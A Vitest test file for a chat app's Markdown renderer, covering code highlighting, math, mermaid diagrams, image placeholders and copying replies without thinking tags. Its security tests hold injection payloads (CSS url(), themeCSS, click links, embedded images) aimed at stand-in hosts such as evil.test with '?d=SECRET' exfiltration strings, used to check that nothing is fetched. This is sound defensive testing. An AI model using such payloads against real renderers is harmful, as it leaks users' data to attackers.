// @vitest-environment jsdom
import { act } from "react";
import { afterEach, beforeAll, describe, expect, it, vi } from "vitest";
import { cleanup, fireEvent, render as renderDom, screen, waitFor } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { renderToStaticMarkup } from "react-dom/server";
import { Markdown } from "./Markdown";
import { replyMarkdown } from "./CopyMessage";
import { LinksProvider } from "./previewContext";

const render = (text: string, query?: string) => renderToStaticMarkup(<Markdown text={text} query={query} />);

afterEach(cleanup);

describe("Markdown", () => {
  it("highlights tagged code, and guesses the language of untagged code, on every render", () => {
    const untagged = "```\nfn parse(line: &str) -> Option<u32> {\n    let n: u32 = line.trim().parse().ok()?;\n    Some(n)\n}\n```";
    // The highlighter is shared between renders, so the second must come out the same as the first.
    for (let i = 0; i < 2; i++) {
      expect(render(untagged)).toMatch(/<code class="hljs language-rust">.*<span class="hljs-keyword">fn<\/span>/s);
      expect(render("```python\ndef f():\n    return 1\n```")).toContain('<span class="hljs-keyword">def</span>');
    }
  });

  it("marks find-in-chat matches in text and in highlighted code", () => {
    const html = render("Restart the **gateway**.\n\n```bash\nsystemctl restart gateway\n```", "GATEWAY");
    expect(html.match(/<mark class="hit">gateway<\/mark>/g)).toHaveLength(2);
    expect(render("Restart the gateway.", "")).not.toContain("<mark");
  });

  it("asks before loading a remote image, naming its host (#341)", () => {
    for (const text of ["![x](https://example.test/p.png?leak=SECRET)", "![x](//example.test/p.png?leak=SECRET)"]) {
      const html = render(text);
      expect(html).not.toMatch(/<img|<link/);
      expect(html).toContain("example.test");
    }
  });

  it("loads a remote image once its placeholder is clicked, without following a link around it", async () => {
    const preview = vi.fn();
    const { container } = renderDom(
      <LinksProvider preview={preview} web={{ openInBrowser: vi.fn() }} onToast={vi.fn()}>
        <Markdown text="[![chart](https://example.test/p.png)](https://example.test/page)" />
      </LinksProvider>,
    );
    expect(container.querySelector("img")).toBeNull();
    await userEvent.click(screen.getByRole("button", { name: /example\.test/ }));
    expect(preview).not.toHaveBeenCalled();
    expect(container.querySelector("img")?.getAttribute("src")).toBe("https://example.test/p.png");
    expect(container.querySelector("img")?.getAttribute("alt")).toBe("chart");
    expect(screen.queryByRole("button", { name: /example\.test/ })).toBeNull();
    await userEvent.click(container.querySelector("img")!);
    expect(preview).toHaveBeenCalledWith({ kind: "web", url: "https://example.test/page" });
  });
});

describe("Math in a reply", () => {
  const shown = (text: string) => {
    const div = document.createElement("div");
    div.innerHTML = render(text);
    return div;
  };
  const tex = (math: Element) => math.querySelector('annotation[encoding="application/x-tex"]')!.textContent!.trim();

  it("typesets inline math between dollars or \\( \\)", () => {
    for (const [text, source] of [
      ["Energy: $E = mc^2$.", "E = mc^2"],
      ["A variable $x$ here.", "x"],
      ["Pythagoras: \\(a^2 + b^2 = c^2\\), always.", "a^2 + b^2 = c^2"],
    ]) {
      const div = shown(text);
      expect(div.querySelectorAll(".katex"), text).toHaveLength(1);
      expect(div.querySelector(".katex-display"), text).toBeNull();
      expect(tex(div.querySelector(".katex")!)).toBe(source);
      expect(div.textContent).not.toMatch(/\$|\\\(|\\\)/);
    }
  });

  it("typesets block math between $$ or \\[ \\], blank lines and all", () => {
    for (const [text, source] of [
      ["$$\n\\int_0^1 x\\,dx\n\n= \\tfrac12\n$$", "\\int_0^1 x\\,dx\n\n= \\tfrac12"],
      ["\\[\nx = \\frac{1}{2}\n\\]", "x = \\frac{1}{2}"],
      ["So \\[\na + b\n\\] holds.", "a + b"],
      ["Then $$y = 2$$ follows.", "y = 2"],
    ]) {
      const div = shown(text);
      expect(div.querySelectorAll(".katex-display"), text).toHaveLength(1);
      expect(tex(div.querySelector(".katex-display")!)).toBe(source);
      expect(div.textContent).not.toMatch(/\$|\\\[|\\\]/);
    }
  });

  it("leaves dollar amounts as prose", () => {
    for (const text of ["It costs $5 and $10.", "From $20,000 to $30,000 a year.", "Pay $5 now or$10 later.", "A lone $ sign, and $ spaced $."]) {
      const div = shown(text);
      expect(div.querySelector(".katex"), text).toBeNull();
      expect(div.textContent).toBe(text);
    }
  });

  it("leaves math in code as code", () => {
    const div = shown("Write `$x$` or `\\(y\\)`.\n\n```\n$$\nz\n$$\n```");
    expect(div.querySelector(".katex")).toBeNull();
    expect([...div.querySelectorAll("code")].map((c) => c.textContent)).toEqual(["$x$", "\\(y\\)", "$$\nz\n$$\n"]);
  });

  it("isn't marked inside by find-in-chat, though the text around it is", () => {
    const div = shown("The mass m is in $E = mc^2$, m for mass.");
    expect(div.querySelector(".katex")).not.toBeNull();
    div.innerHTML = render("The mass m is in $E = mc^2$, m for mass.", "m");
    expect(div.querySelector(".katex mark")).toBeNull();
    expect(div.querySelectorAll("mark.hit").length).toBeGreaterThan(0);
  });
});

describe("A mermaid diagram in a reply", () => {
  const LONG = 30_000;
  const fenced = (source: string) => "```mermaid\n" + source + "\n```";
  // An svg in a code block other than its header's icons.
  const diagram = (container: HTMLElement) => [...container.querySelectorAll(".code svg")].find((svg) => !svg.closest(".code-head")) ?? null;
  const drawn = (container: HTMLElement) => waitFor(() => expect(diagram(container)).not.toBeNull(), { timeout: LONG });

  beforeAll(() => {
    // jsdom has no layout; mermaid measures boxes and text to place them.
    Object.assign(SVGElement.prototype, {
      getBBox: () => ({ x: 0, y: 0, width: 80, height: 20 }),
      getComputedTextLength: () => 40,
    });
  });

  it("is drawn, with a way back to its source, and copies its source", { timeout: LONG }, async () => {
    const writeText = vi.fn(async () => {});
    vi.stubGlobal("navigator", { ...navigator, clipboard: { writeText } });
    try {
      const source = "flowchart TD\n  Start-->Stop";
      const { container } = renderDom(<Markdown text={fenced(source)} />);
      await drawn(container);
      expect(diagram(container)!.textContent).toContain("Start");
      expect(container.querySelector(".code-head span")!.textContent).toBe("mermaid");
      fireEvent.click(container.querySelector(".code-copy")!);
      expect(writeText).toHaveBeenCalledWith(source + "\n");
      await userEvent.click(screen.getByRole("button", { name: "Source" }));
      expect(diagram(container)).toBeNull();
      expect(container.querySelector("pre")!.textContent).toBe(source + "\n");
      await userEvent.click(screen.getByRole("button", { name: "Diagram" }));
      expect(diagram(container)).not.toBeNull();
    } finally {
      vi.unstubAllGlobals();
    }
  });

  it("that can't be drawn shows its source, with a note saying why", { timeout: LONG }, async () => {
    const source = "graph TD\n  A[never closed";
    const { container } = renderDom(<Markdown text={fenced(source)} />);
    await screen.findByText(/^Couldn't draw this diagram: \S/, undefined, { timeout: LONG });
    expect(diagram(container)).toBeNull();
    expect(container.querySelector("pre")!.textContent).toBe(source + "\n");
    expect(screen.queryByRole("button", { name: "Diagram" })).toBeNull();
  });

  it("is drawn only once it scrolls into view", { timeout: LONG }, async () => {
    const observers: { see: () => void }[] = [];
    vi.stubGlobal(
      "IntersectionObserver",
      class {
        constructor(private callback: (entries: { isIntersecting: boolean }[]) => void) {
          observers.push(this);
        }
        see = () => this.callback([{ isIntersecting: true }]);
        observe() {}
        unobserve() {}
        disconnect() {}
      },
    );
    try {
      const { container } = renderDom(<Markdown text={fenced("flowchart LR\n  Seen-->Later")} />);
      await new Promise((r) => setTimeout(r, 500));
      expect(diagram(container)).toBeNull();
      expect(container.querySelector("pre")!.textContent).toContain("Seen-->Later");
      act(() => observers.forEach((o) => o.see()));
      await drawn(container);
    } finally {
      vi.unstubAllGlobals();
    }
  });

  it("leaves a mermaid fence quoted in other code as code", () => {
    const html = render("````markdown\n" + fenced("flowchart TD\n  A-->B") + "\n````");
    expect(html).toContain('<div class="code-head"><span>markdown</span>');
    expect(html).toContain("```mermaid\nflowchart TD\n  A--&gt;B\n```");
  });

  // A reply can carry text an attacker wrote (a web page, a file), so a diagram must never make the app fetch anything.
  it("keeps config, styles and links from reaching off the app", { timeout: LONG }, async () => {
    for (const source of [
      '%%{init: {"themeCSS": ".x{fill:url(https://evil.test/c?d=SECRET)}"}}%%\nflowchart TD\n  A-->B',
      '%%{init: {"fontFamily": "x;}.y{fill:url(https://evil.test/f)"}}%%\nflowchart TD\n  A-->B',
      "---\nconfig:\n  themeCSS: \".x{fill:url(https://evil.test/m)}\"\n---\nflowchart TD\n  A-->B",
      'flowchart TD\n  A-->B\n  click A href "https://evil.test/k"',
      "flowchart TD\n  A-->B\n  classDef e fill:url(https://evil.test/d)\n  class A e\n  style B stroke:url(https://evil.test/s)",
      'flowchart TD\n  A["<img src=https://evil.test/h.png>"]-->B["`![x](https://evil.test/md.png)`"]',
    ]) {
      const { container, unmount } = renderDom(<Markdown text={fenced(source)} />);
      await drawn(container);
      const svg = diagram(container)!;
      // An attacker's URL may show as a label's text; it must never be an attribute or styling a browser fetches.
      const outbound = [svg, ...svg.querySelectorAll("*")].flatMap((el) => [
        ...[...el.attributes].map((a) => a.value),
        ...(el.tagName.toLowerCase() === "style" ? [el.textContent ?? ""] : []),
      ]);
      expect(outbound.filter((v) => v.includes("evil.test")), source).toEqual([]);
      expect(svg.querySelector("img, image, foreignObject"), source).toBeNull();
      unmount();
    }
  });

  it("that shows an image isn't drawn, so the image is never fetched", { timeout: LONG }, async () => {
    const fetched: string[] = [];
    vi.stubGlobal(
      "Image",
      class {
        set src(url: string) {
          fetched.push(url);
        }
      },
    );
    try {
      const source = 'flowchart TD\n  A@{ img: "https://evil.test/a.png?d=SECRET", label: "x" }';
      // A diagram after it, drawn once the one before has had its turn.
      const { container } = renderDom(<Markdown text={fenced(source) + "\n\n" + fenced("flowchart TD\n  After-->It")} />);
      await drawn(container);
      const [first] = container.querySelectorAll(".code");
      expect(first.querySelector("svg")).toBeNull();
      expect(first.querySelector("pre")!.textContent).toBe(source + "\n");
      expect(first.textContent).toMatch(/links an image/);
      expect(fetched.filter((url) => url.includes("evil.test"))).toEqual([]);
    } finally {
      vi.unstubAllGlobals();
    }
  });
});

describe("A reply's words to copy", () => {
  it("keeps the reply's Markdown as Hermes wrote it", () => {
    const reply = "## Fixed\n\n- Restarted **gateway**\n- See [logs](https://nas/logs)\n\n```bash\nsystemctl status gateway\n```";
    expect(replyMarkdown(reply)).toBe(reply);
  });

  it("leaves out thinking written inline, and the blank lines after it", () => {
    expect(replyMarkdown("<think>The owner wants a yes.\nKeep it short.</think>\n\nYes, it's up.")).toBe("Yes, it's up.");
    expect(replyMarkdown("First.\n\n<THINKING>check the port</THINKING>\n\n\nSecond.")).toBe("First.\n\nSecond.");
    expect(replyMarkdown("<think>short</think> Yes.")).toBe("Yes.");
  });

  it("leaves out thinking sections one straight after another", () => {
    expect(replyMarkdown("<think>first</think><think>second</think>Yes.")).toBe("Yes.");
    expect(replyMarkdown("<think>first</think>\n<reasoning>second</reasoning>\n\nYes.")).toBe("Yes.");
    expect(replyMarkdown("<think>first</think> <think>never closed")).toBe("");
  });

  it("leaves out thinking never closed, at the start or after the reply's words", () => {
    expect(replyMarkdown("<reasoning>still going")).toBe("");
    expect(replyMarkdown("Let me check.\n<think>private reasoning\nmore of it")).toBe("Let me check.");
  });

  it("keeps a tag mentioned mid-sentence or shown in code", () => {
    expect(replyMarkdown("Wrap it in `<think>` tags.")).toBe("Wrap it in `<think>` tags.");
    expect(replyMarkdown("Put `<think>` before and `</think>` after.")).toBe("Put `<think>` before and `</think>` after.");
    const xml = "The format:\n\n```xml\n<think>example</think>\n<answer>42</answer>\n```\n\n~~~\n<reasoning>\nopen\n~~~";
    expect(replyMarkdown(xml)).toBe(xml);
    expect(replyMarkdown("    <think>indented code</think>")).toBe("    <think>indented code</think>");
    const listed = "- The format:\n\n  ```xml\n  <think>example</think>\n  ```\n\n<think>real</think>\nDone.";
    expect(replyMarkdown(listed)).toBe("- The format:\n\n  ```xml\n  <think>example</think>\n  ```\n\nDone.");
    expect(replyMarkdown("Type `a\n<think>` and the rest stays.")).toBe("Type `a\n<think>` and the rest stays.");
  });

  it("keeps blank lines and indentation, dropping only blank lines at the start and end", () => {
    const code = "    let a = 1;\n\n\n\n    let b = 2;";
    expect(replyMarkdown(code)).toBe(code);
    expect(replyMarkdown("```\nline one\n\n\n\nline five\n```")).toBe("```\nline one\n\n\n\nline five\n```");
    expect(replyMarkdown("\n\n  - item\n\n")).toBe("  - item");
  });
});
